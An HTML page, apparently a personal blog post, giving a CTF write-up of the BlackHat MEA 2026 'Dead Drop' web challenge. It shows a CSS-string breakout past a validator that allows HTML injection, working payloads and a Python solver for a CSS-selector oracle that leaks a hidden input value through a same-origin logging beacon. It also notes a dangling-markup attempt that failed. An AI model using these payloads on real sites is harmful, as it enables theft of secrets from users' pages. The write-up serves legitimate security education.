@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Dead Drop · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="The per-drop &quot;envelope cipher&quot; CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/dead-drop/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="Dead Drop · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="The per-drop &quot;envelope cipher&quot; CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/dead-drop/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="Dead Drop · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="The per-drop &quot;envelope cipher&quot; CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Dead Drop: BlackHat MEA 2026 CTF writeup",
+  "description": "The per-drop \"envelope cipher\" CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/dead-drop/"
+  },
+  "articleSection": "Web",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 12 of 15</span>
+          <span>Web</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">Dead Drop<span class="dot">.</span></h1>
+          <p class="deck">Poste Restante is an anonymous dead-drop board: leave a message, dress up the envelope with a little custom CSS, and every drop keeps its own private pickup log. Leave a message, never meet the courier.</p>
+          <p class="wu-meta">
+            <span class="cat cat-web">Web</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>The per-drop "envelope cipher" CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed verbatim into a &lt;style&gt; block, and a CSS string literal may contain &lt;/style&gt;, giving arbitrary HTML injection (including a second &lt;style&gt; that never sees the validator). Under a JS-free CSP (default-src 'none'; style-src 'unsafe-inline'; img- src 'self'), the same-origin pickup beacon /px/:id logs the full request URL including query string into an owner-readable log, so html:has(input[value^='…']) #qN{background:url(/px/ COLLECTOR?p=N)} rules turn the headless-Chrome courier bot into a CSS-selector oracle that leaks the courier-only hidden &lt;input value="BHFlagY{…}"&gt; one character at a time.</p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{ea9380bc79fd02eefb1fbb538337a432}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{f4e3c8951a06dad601af1687cf8fd74d}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>App surface (Express-style Node app, session cookie sid=&lt;32 hex&gt;, HttpOnly; SameSite=Lax):</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>ENDPOINT             BEHAVIOUR
+
+GET /                Compose form ( title , body , css ) + "Your drops" ledger, scoped to sid</code></pre></figure>
+<p>POST /post 302 → /post/&lt;id&gt;; on rejection 400 theme rejected: it contains a disallowed CSS construct</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>GET /post/:id        Renders the drop; ships the restrictive CSP
+
+GET /post/:id/       JSON pickup log, owner-only ( {"error":"not your post"} otherwise, {"error":"no such
+views                post"} for unknown ids)</code></pre></figure>
+<p>GET /px/:id 66-byte 1×1 PNG, Cache-Control: no-store; appends {"beacon": "&lt;full path+query&gt;", "at": &lt;ms&gt;} to drop:id's log</p>
+<p>POST /report Summons the courier bot (footer advertises CHROME 143.0.7499.192 · LINUX/AMD64), which renders the drop within ~2 s</p>
+<p>No source disclosure (/source, /package.json, /.git/HEAD, <code>/flag</code> all 404).</p>
+<p>Drop-page CSP:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self'; base-uri 'none'
+Referrer-Policy: no-referrer</code></pre></figure>
+<p>No script, no external hosts, but same-origin images are allowed, and /px/ is a same-origin writable, readable logging sink. Confirmed the query string is logged verbatim: requesting /px/1?leak=AAA (200) produced {"beacon":"/px/1?leak=AAA",…} in /post/1/views.</p>
+<p>Body sanitizer (allowlist): drops script, img, iframe, object, svg, style, input; unwraps a; keeps b, i, div with id / class (strips style). Input &lt;a href="/x"&gt;a&lt;/a&gt;&lt;b&gt;b&lt;/b&gt;&lt;i&gt;i&lt;/i&gt;&lt;div id=d class=c style="color:red"&gt;d&lt;/div&gt; rendered as a&lt;b&gt;b&lt;/b&gt;&lt;i&gt;i&lt;/i&gt;&lt;div id="d" class="c"&gt;d&lt;/div&gt;. Crucially it leaves raw ' and &gt; in text nodes.</p>
+<p>CSS validator, a real parser with an allowlist, probed rule by rule:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>body{color:red}                        302   a{}                                 400
+/*c*/body{color:red}                   302   @import url("/x.css");              400
+input{color:red}                       302   body{background:url("/px/2")}       400
+a[b]{color:red}                        302   a{background:URL(/x)}               400
+a[b=c]{color:red}                      302   a{background:u\72 l(/x)}            400
+a:has(b){color:red}                    302   a{content:"x"}   a::before{…}       400
+a:hover{color:red}                     302   @media / @font-face                 400
+a{color:rgb(1,2,3)}                    302   a{width:attr(value)}                400
+                                             a{background-image:image-set("/x")} 400
+                                             a{--x:1}   a{transform:…}           400
+                                             input[value^="a"]{color:red}        400</code></pre></figure>
+<p>So <code>url()</code>, at-rules, content:, <code>attr()</code>, image-<code>set()</code>, custom properties and [value^=] are all blocked at the top level, which is exactly why the injected, unvalidated &lt;style&gt; matters.</p>
+<p>Size cap on css: 15 788 bytes accepted, 21 138 bytes rejected with the same "disallowed CSS construct" message.</p></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p>Root cause: the validated CSS is reflected verbatim into &lt;style&gt;, and the validator has no notion of HTML context.</p>
+<p>The parser tokenizes a CSS string literal as an opaque value, so anything inside quotes passes. All of these returned 302:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">html</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>a{font-family:"url"}         a{font-family:"a{b}"}     a{font-family:"&lt;img&gt;"}
+a{font-family:"IMPORT"}      a{font-family:"a@b"}      a{font-family:"&lt;/style&gt;&lt;img&gt;"}</code></pre></figure>
+<p>The server then emits the string unencoded:</p>
+<p class="codelabel">&lt;style&gt; a{font-family:"&lt;/style&gt;"} &lt;/style&gt;</p>
+<p>During HTML parsing the inner &lt;/style&gt; terminates the style element (raw-text elements end at the first matching end tag, quotes have no meaning to the tokenizer), so everything after it is live markup. Because the breakout happens in &lt;head&gt;, injecting a &lt;div&gt; implicitly opens &lt;body&gt;, making the injected nodes the first body children.</p>
+<p>Two consequences compound:</p>
+<ol class="steps"><li>A &lt;style&gt; injected this way never passes through the validator, so url(...) and [value^=...], the two constructs the allowlist exists to block, are both available again inside it. CSP permits it: style-src 'unsafe-inline'.</li><li>img-src 'self' + /px/:id gives an exfiltration channel that never leaves the origin. /px/:id logs the full request URL including query string, and /post/:id/views lets the owner read that log. Attacker-controlled write, attacker-readable read, both same-origin.</li></ol>
+<p>The secret lives in a courier-only conditional block: /post/:id for a normal visitor renders an empty region right after the classification bar, but the bot's render contains one extra body child, &lt;input type="hidden" value="BHFlagY{…}"&gt;. With:<code>has()</code> allowed and CSS-attribute-prefix selectors available inside the injected style, that value is extractable character by character.</p><figure class="meme"><div class="meme-card"><p class="meme-cap top">A REAL CSS PARSER WITH A STRICT ALLOWLIST</p><svg viewBox="0 0 560 200" role="img" xmlns="http://www.w3.org/2000/svg">
+<rect width="560" height="200" fill="#100e0d"/>
+<text x="140" y="26" fill="#6f6659" font-family="monospace" font-size="11" text-anchor="middle" letter-spacing="2">WHAT THE BRIEF SAID</text>
+<text x="420" y="26" fill="#e5484d" font-family="monospace" font-size="11" text-anchor="middle" letter-spacing="2">WHAT WAS BEHIND IT</text>
+<rect x="118" y="108" width="44" height="62" fill="none" stroke="#d6cfc3" stroke-width="1.5"/>
+<circle cx="153" cy="140" r="2.5" fill="#d6cfc3"/>
+<rect x="330" y="48" width="180" height="122" fill="none" stroke="#e5484d" stroke-width="1.5"/>
+<circle cx="498" cy="112" r="3.5" fill="#e5484d"/>
+<path d="M350 70h140M350 86h120M350 102h140M350 118h100M350 134h130M350 150h90" stroke="#e5484d" stroke-width="1" opacity=".45"/>
+<path d="M60 178h440" stroke="#6f6659" stroke-width="1" opacity=".5"/>
+</svg><p class="meme-cap bot">A CSS STRING MAY CONTAIN &lt;/style&gt;</p></div></figure></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><ol class="steps"><li>Bootstrap a session. GET / sets sid. Everything, drops, pickup logs, is scoped to it; a drop's log is readable only by its creator, so the collector drop must be your own.</li><li>Create a collector drop with harmless CSS (b{color:red}) and note its id C. Its log at /post/C/ views is the read side of the oracle.</li><li>Build the probe payload and smuggle it through the validator as a CSS string:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">html</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>css = a{font-family:"&lt;/style&gt;&lt;div id=Q&gt;&lt;i id=q0&gt;&lt;/i&gt;…&lt;i id=qN&gt;&lt;/i&gt;&lt;/div&gt;&lt;style&gt;
+        i[id]{display:block;width:3px;height:3px;background-color:black}
+        #q0{background-image:url(/px/C?p=zctl)}
+        html:has(SELECTOR_1) #q1{background-image:url(/px/C?p=c0)}
+        …
+      &lt;/style&gt;"</code></pre></figure>
+<p>Notes that matter: the payload may contain no " or \ (they would close/escape the CSS string); each &lt;i&gt; needs an explicit box (display:block + size) or Chrome never fetches its background; #q0 is unconditional and acts as the "the courier actually rendered" control beacon.</p>
+<ol class="steps" start="4"><li>Fire one round: POST /post the probe drop → POST /report with its id → poll /post/C/views until new entries stop arriving (~3 s of quiet), then read which?p= names fired. First beacon lands ~2.1 s after /report; a 17-probe round completes in ~5.4 s end to end.</li><li>Structure fingerprint. Probe body&gt;:nth-child(4..12):</li><li>self-render: n4, n5, n6 fire → 6 body children</li><li>courier render: n4, n5, n6, n7 → 7 body children; the extra node is at position 4</li><li>Identify the extra node. Probe body&gt;TAG:nth-child(4) across 24 tags and body&gt;:nth-child(4) [ATTR] across 9 attributes. Courier fired exactly t_input, a_value, a_hidden, i.e. &lt;input type="hidden" value="…"&gt;. Body order on a probe page is therefore:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>1 div#Q (injected) 2 style (injected)   3 div.st-classbar
+4 courier-only hidden input             5 main 6 div.st-foot   7 img (/px/:id)</code></pre></figure>
+<ol class="steps" start="7"><li>Prefix extraction. One probe per candidate character, all resolved in a single courier visit:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>html:has(body&gt;input:nth-child(4)[value^='&lt;prefix&gt;&lt;char&gt;']) #qN{background-image:url(/px/C?p=cN)}</code></pre></figure>
+<p>Start with the full printable charset for the first characters; once the format is clear, switch to the 17-char set 0123456789abcdef} (} doubles as the terminator). Retry a round up to 3× when the control beacon zctl does not fire (courier never rendered).</p>
+<ol class="steps" start="8"><li>Verify with an exact-match pair in one round: body&gt;input:nth-child(4)[value='FLAG'] fires and [value='FLAGX'] does not.</li></ol>
+<p>Result on the first instance: BHFlagY{ea9380bc79fd02eefb1fbb538337a432} (41 chars, ~5 s/char once the payload was small). Re-running the packaged script unattended against a fresh instance produced BHFlagY{f4e3c8951a06dad601af1687cf8fd74d} with verified: True, the flag is generated per instance.</p>
+<p>Solver: <code>/home/kali/Desktop/CTF/Crpto/Hokan/solution/solve_dead_drop.py</code> (python3 <code>solve_dead_drop.py</code> http://&lt;instance-host&gt;).</p>
+<p>Key code @staticmethod def wrap(payload): """Hide an HTML payload inside a CSS string so the validator only ever sees a{font-family:"&lt;string&gt;"}.""" assert '"' not in payload, "payload may not contain a double quote"</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>         assert "\\" not in payload, "payload may not contain a backslash"
+         return 'a{font-family:"%s"}' % payload
+
+     @staticmethod
+     def probe_payload(collector, probes):
+         """probes: [(name, selector_or_None)] -- None means unconditional.
+
+         One &lt;i id=qN&gt; per probe; a probe fires /px/&lt;collector&gt;?p=&lt;name&gt; only
+         when its :has() selector matches. &lt;i&gt; elements are given a real box
+         so the background image is actually fetched."""
+         targets = "".join("&lt;i id=q%d&gt;&lt;/i&gt;" % k for k in range(len(probes)))
+         rules = ["i[id]{display:block;width:3px;height:3px;background-color:black}"]
+         for k, (name, selector) in enumerate(probes):
+             url = "url(/px/%d?p=%s)" % (collector, name)
+             if selector is None:
+                 rules.append("#q%d{background-image:%s}" % (k, url))
+             else:
+                 rules.append("html:has(%s) #q%d{background-image:%s}"
+                              % (selector, k, url))
+         return "&lt;/style&gt;&lt;div id=Q&gt;%s&lt;/div&gt;&lt;style&gt;%s&lt;/style&gt;" % (targets, "".join(rules))
+
+# extraction round: one probe per candidate character, resolved in a single courier visit
+TARGET = "body&gt;input:nth-child(4)"
+probes = [("zctl", None)]
+probes += [("c%d" % i, "%s[value^='%s']" % (TARGET, prefix + c))
+           for i, c in enumerate("0123456789abcdef}")]</code></pre></figure></section><section id="dead-ends"><h2><span class="hn">04</span>Dead ends</h2><ul class="bullets"><li>Dangling markup looked like a one-shot dump and is dead. The body sanitizer leaves raw ' and &gt;, so css = a{font-family:"&lt;/style&gt;&lt;img src='/px/C?d="} with body = '&gt; really does build an &lt;img&gt; whose src swallows the entire courier-only region, confirmed present in the DOM via chromium -- headless --dump-dom. Chrome simply never requests it. Reproduced locally against a saved copy of the real page served over http://127.0.0.1:8765 with --log-net-log, then bisected the swallowed prefix: "}\n (6 chars) → FETCH, "}\n &lt; (8 chars) → no. Chrome's dangling-markup mitigation drops any resource URL containing both a newline and &lt;. Isolated control cases confirmed it: a URL with only newlines fetched (?nl=a\nb\nc → logged as?nl=abc), a URL with only &lt;div class="m"&gt; fetched, the combination did not. That is what forced the CSS-selector route.</li><li>TARGET = "input" silently extracts the wrong value. A bare input also matches the report form's &lt;input type="hidden" name="id" value="&lt;drop id&gt;"&gt;. Because that value is numeric, the very first round with an empty prefix locks onto a digit of the drop id, the fresh-instance run produced FLAG: 1 / verified: False. It went unnoticed originally only because the switch to the bare selector happened while resuming from the known prefix BHFlagY{ea, which can never collide. Fixed to the positional body&gt;input:nth-child(4).</li><li>Probe-name collision with the result parser. Naming the control probe ctl broke chars[int(name[1:])] with ValueError: invalid literal for <code>int()</code> with base 10: 'tl'; renamed to zctl / zbase so no control name starts with c.</li><li>Payload size, not the bot, was the bottleneck. A ~150-probe page (two-character rounds over a 17×17 pair space) ran ~2.5–3 min per character and then hit the css cap outright, 400 theme rejected at 21 138 bytes, accepted at 15 788. Shrinking to a 17-char hex charset cut a full round to 5.4 s.</li><li>Instance volatility. The first host went 503 for ~6 minutes mid-analysis and came back with all drops and the sid session wiped (/post/:id/views → {"error":"not your post"} for pre-restart ids), forcing a re-bootstrap. Later the same hostname was recycled to a different challenge entirely. On the fresh instance the first character took ~13 min before throughput settled to ~7 s/char; an isolated probe during the stall returned in 7.3 s, so the backlog was courier-queue side, the 3-attempt retry on a missing control beacon is what carried the run through.</li></ul></section>
+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/upyx/"><span class="dir">← Previous</span><span class="t">upyx</span></a><a class="nx" href="/blog/blackhat-mea-2026-quals/lumen/"><span class="dir">Next →</span><span class="t">Lumen</span></a></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
